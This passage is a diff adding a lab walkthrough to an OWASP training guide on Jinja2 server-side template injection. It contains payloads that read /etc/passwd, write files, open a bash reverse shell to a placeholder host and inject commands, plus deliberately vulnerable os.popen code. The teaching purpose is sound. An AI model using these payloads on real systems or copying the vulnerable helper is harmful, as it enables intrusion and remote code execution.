@@ -16,11 +16,63 @@ that is being used by the application.
 Included [here](https://github.com/RiieCco/owasp-bay-area/tree/master/course-guide/server-side-template-injection/report.html) is the scan report of a Burp intruder scan on the target. Use this scan report to pinpoint the exact location of the vulnerability.
 
 
+#### This works for python 2
 
+Jinja2 - Read remote file
+```
+# ''.__class__.__mro__[2].__subclasses__()[40] = File class
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+```
 
+Jinja2 - Write into remote file
+```
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
+```
+Jinja2 - Remote Code Execution via reverse shell
+Listen for connexion
+```
+nv -lnvp 8000
+```
 
+Inject this template
+```
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} # evil config
+{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  # load the evil config
+{{ config['RUNCMD']('bash -i >& /dev/tcp/xx.xx.xx.xx/8000 0>&1',shell=True) }} # connect to evil host
+```
 
+#### However we use python3 
 
+In this scenario we use python3 to leverage the attack so the method as mentioned above is no longer
+valid. We need to find other ways for exploitation. Even without nice methods to iterate the subclasses 
+as with python3 we can still get a lot of interesting information about the system.
 
+try to inject:
 
+```
+{{ config.items() }}
+```
 
+#### Spoiler - exploitation of the target.
+
+The developer of this application thought it was a good idea to have a generic function for his
+monitoring and make this function callable by the templating engine, this way he could easilly utilize 
+system commands on a easy and secure way (or so he thought) to monitor the system.
+
+We can now abuse the template expression to invoke this command with our own 
+system command injection like
+
+```
+http://0.0.0.0:8081/{{system_call('netcat listener pwn')}}
+```
+
+Here follows the code that is responsible for the vulnerability:
+
+```
+@app.context_processor
+def utility_processor():
+    def system_call(command):
+        output = os.popen(command).read()
+        return output
+    return dict(system_call=system_call)
+```
